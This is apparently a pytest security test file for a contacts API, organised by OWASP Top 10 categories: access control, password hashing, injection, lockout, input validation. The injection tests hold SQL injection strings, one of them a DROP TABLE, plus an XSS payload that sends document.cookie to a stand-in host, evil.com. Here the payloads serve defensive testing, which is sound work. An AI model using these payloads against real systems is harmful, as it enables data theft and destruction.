"""
OWASP Security Tests.

Tests based on OWASP Top 10 2021:
- A01: Broken Access Control
- A02: Cryptographic Failures
- A03: Injection
- A07: Identification and Authentication Failures
- A09: Security Logging and Monitoring Failures
"""
import pytest
from httpx import AsyncClient


@pytest.mark.security
class TestBrokenAccessControl:
    """
    OWASP A01:2021 - Broken Access Control
    
    Tests:
    - Horizontal privilege escalation (accessing other users' data)
    - Vertical privilege escalation (regular user accessing admin functions)
    - Missing authorization checks
    """
    
    async def test_horizontal_privilege_escalation(
        self,
        client: AsyncClient,
        user_token: str,
        user_factory,
        db_session
    ):
        """Test user cannot access another user's resources."""
        # Create another user with contact
        other_user = await user_factory("victim@example.com")
        
        from app.crud import contact as contact_crud
        from app.schemas.contact import ContactCreate
        
        victim_contact = await contact_crud.create_with_user(
            db_session,
            obj_in=ContactCreate(name="Victim Contact"),
            user_id=other_user.id
        )
        await db_session.commit()
        
        # Try to access victim's contact
        response = await client.get(
            f"/api/v1/contacts/{victim_contact.id}",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        
        assert response.status_code == 404  # Not 403 (prevents enumeration)
    
    async def test_vertical_privilege_escalation(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test regular user cannot access admin endpoints."""
        # Try to access admin endpoint
        response = await client.get(
            "/api/v1/admin/users",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        
        assert response.status_code == 403
        assert "permission" in response.json()["detail"].lower()
    
    async def test_missing_authentication(self, client: AsyncClient):
        """Test endpoints require authentication."""
        # Try to access protected endpoint without token
        response = await client.get("/api/v1/contacts/")
        
        assert response.status_code == 401


@pytest.mark.security
class TestCryptographicFailures:
    """
    OWASP A02:2021 - Cryptographic Failures
    
    Tests:
    - Password storage (hashing, not plaintext)
    - Strong hashing algorithm (bcrypt)
    - Sensitive data in responses
    """
    
    async def test_password_not_returned_in_api(
        self,
        client: AsyncClient
    ):
        """Test password is never returned in API responses."""
        response = await client.post(
            "/api/v1/auth/register",
            json={
                "email": "test@example.com",
                "password": "SecurePass123!"
            }
        )
        
        data = response.json()
        response_str = str(data).lower()
        
        # Neither password nor hash should be in response
        assert "securepass" not in response_str
        assert "password" not in response_str
        assert "hash" not in response_str
    
    async def test_strong_password_hashing(
        self,
        client: AsyncClient,
        db_session
    ):
        """Test passwords are hashed with strong algorithm (bcrypt)."""
        from app.crud import user as user_crud
        from app.schemas.user import UserCreate
        
        user = await user_crud.create(
            db_session,
            obj_in=UserCreate(
                email="test@example.com",
                password="TestPass123!"
            )
        )
        
        # Password hash should be bcrypt format
        assert user.password_hash.startswith("$2b$")
        
        # Should have appropriate cost factor (12)
        parts = user.password_hash.split("$")
        cost = int(parts[2])
        assert cost >= 12  # Minimum secure cost


@pytest.mark.security
class TestInjection:
    """
    OWASP A03:2021 - Injection
    
    Tests:
    - SQL injection attempts
    - XSS in inputs
    - Command injection
    """
    
    async def test_sql_injection_in_search(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test SQL injection in search parameter."""
        # Try SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE contacts--",
            "1' UNION SELECT * FROM users--"
        ]
        
        for payload in sql_payloads:
            response = await client.get(
                f"/api/v1/contacts/?search={payload}",
                headers={"Authorization": f"Bearer {user_token}"}
            )
            
            # Should not cause error (parameterized queries protect)
            assert response.status_code == 200
            # Should return empty results (no actual match)
            assert response.json() == []
    
    async def test_xss_in_contact_name(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test XSS attempts in contact name."""
        xss_payload = "<script>alert('XSS')</script>"
        
        response = await client.post(
            "/api/v1/contacts/",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "name": xss_payload,
                "email": "test@example.com"
            }
        )
        
        # Backend should accept it (validation should happen on frontend)
        # But should be properly escaped when rendered
        assert response.status_code == 201
        data = response.json()
        # Name is stored as-is (React will escape on render)
        assert data["name"] == xss_payload
    
    async def test_script_tag_in_notes(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test script tags in notes field."""
        payload = "<script>fetch('evil.com/steal?data='+document.cookie)</script>"
        
        response = await client.post(
            "/api/v1/contacts/",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "name": "Test",
                "notes": payload
            }
        )
        
        assert response.status_code == 201


@pytest.mark.security
class TestAuthenticationFailures:
    """
    OWASP A07:2021 - Identification and Authentication Failures
    
    Tests:
    - Weak password acceptance
    - Account lockout (brute force protection)
    - Session management
    """
    
    async def test_weak_password_rejected(self, client: AsyncClient):
        """Test weak passwords are rejected."""
        weak_passwords = [
            "short",           # Too short
            "nouppercase1!",   # No uppercase
            "NOLOWERCASE1!",   # No lowercase
            "NoDigits!",       # No digits
            "NoSpecial1",      # No special chars
        ]
        
        for password in weak_passwords:
            response = await client.post(
                "/api/v1/auth/register",
                json={
                    "email": f"test-{password}@example.com",
                    "password": password
                }
            )
            
            assert response.status_code == 422  # Validation error
    
    async def test_brute_force_protection(
        self,
        client: AsyncClient,
        test_user
    ):
        """Test account lockout after failed login attempts."""
        # Attempt 5 failed logins
        for _ in range(5):
            await client.post(
                "/api/v1/auth/login",
                data={
                    "username": test_user.email,
                    "password": "WrongPassword"
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
        
        # 6th attempt should be blocked (even with correct password)
        response = await client.post(
            "/api/v1/auth/login",
            data={
                "username": test_user.email,
                "password": "TestPass123!"  # Correct!
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        assert response.status_code == 403
        assert "locked" in response.json()["detail"].lower()
    
    async def test_token_expiration(
        self,
        client: AsyncClient
    ):
        """Test expired tokens are rejected."""
        from app.core.security import create_access_token
        from datetime import timedelta
        
        # Create an expired token (-1 hour)
        expired_token = create_access_token(
            data={"sub": "test@example.com"},
            expires_delta=timedelta(hours=-1)
        )
        
        response = await client.get(
            "/api/v1/users/me",
            headers={"Authorization": f"Bearer {expired_token}"}
        )
        
        assert response.status_code == 401


@pytest.mark.security
class TestInputValidation:
    """
    Additional input validation tests.
    
    Tests:
    - Email format validation
    - Phone number validation
    - Length limits
    """
    
    async def test_invalid_email_format(self, client: AsyncClient):
        """Test invalid email formats are rejected."""
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user space@example.com"
        ]
        
        for email in invalid_emails:
            response = await client.post(
                "/api/v1/auth/register",
                json={
                    "email": email,
                    "password": "SecurePass123!"
                }
            )
            
            assert response.status_code == 422
    
    async def test_invalid_phone_number(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test invalid phone numbers are rejected."""
        response = await client.post(
            "/api/v1/contacts/",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "name": "Test",
                "phones": [
                    {
                        "phone_data": {
                            "phone_number": "invalid",  # Not a valid phone
                            "phone_type": "mobile"
                        }
                    }
                ]
            }
        )
        
        # Should fail validation
        assert response.status_code in [400, 422]
    
    async def test_extremely_long_input(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test extremely long inputs are rejected."""
        response = await client.post(
            "/api/v1/contacts/",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "name": "A" * 10000,  # Way too long
                "email": "test@example.com"
            }
        )
        
        assert response.status_code == 422


@pytest.mark.security
class TestCSRFProtection:
    """
    CSRF protection tests.
    
    Note: FastAPI uses SameSite cookies for CSRF protection.
    """
    
    async def test_state_changing_requires_auth(
        self,
        client: AsyncClient
    ):
        """Test state-changing operations require authentication."""
        # Try to create contact without auth
        response = await client.post(
            "/api/v1/contacts/",
            json={"name": "Test"}
        )
        
        assert response.status_code == 401
    
    async def test_get_requests_idempotent(
        self,
        client: AsyncClient,
        user_token: str
    ):
        """Test GET requests don't modify state."""
        # GET should be safe to call multiple times
        for _ in range(3):
            response = await client.get(
                "/api/v1/contacts/",
                headers={"Authorization": f"Bearer {user_token}"}
            )
            assert response.status_code == 200
